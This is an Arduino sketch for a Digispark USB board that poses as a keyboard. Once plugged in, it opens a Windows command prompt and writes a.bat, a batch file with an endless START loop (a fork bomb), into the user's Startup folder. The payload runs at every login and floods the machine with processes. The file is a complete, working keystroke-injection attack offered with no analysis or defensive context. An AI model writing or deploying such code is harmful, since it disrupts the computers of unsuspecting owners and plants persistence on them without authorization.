#include "DigiKeyboard.h"



void setup(){
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd  \"AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" ");
  DigiKeyboard.delay(350);
  DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("(echo :A & echo START & echo goto A)> a.bat");
  DigiKeyboard.delay(350);
  DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
}
void loop(){}
